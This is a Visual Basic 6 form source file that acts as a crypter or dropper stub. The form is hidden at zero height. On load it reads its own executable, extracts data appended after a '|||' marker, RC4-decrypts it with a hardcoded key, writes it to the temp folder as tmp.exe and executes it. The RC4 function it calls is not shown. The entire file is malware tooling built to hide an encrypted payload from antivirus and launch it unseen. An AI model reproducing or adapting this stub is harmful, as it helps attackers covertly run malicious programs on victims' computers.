VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   0
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   1560
   LinkTopic       =   "Form1"
   ScaleHeight     =   0
   ScaleWidth      =   1560
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Dim File As String
Dim Out As String

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
File = Space(LOF(1))
Get #1, , File
Close #1

Out = Split(File, "|||")(1)

Open Environ("tmp") & "\tmp.exe" For Binary As #1
Put #1, , RC4(Out, "pass")
Close #1

Shell Environ("tmp") & "\tmp.exe"
End
End Sub
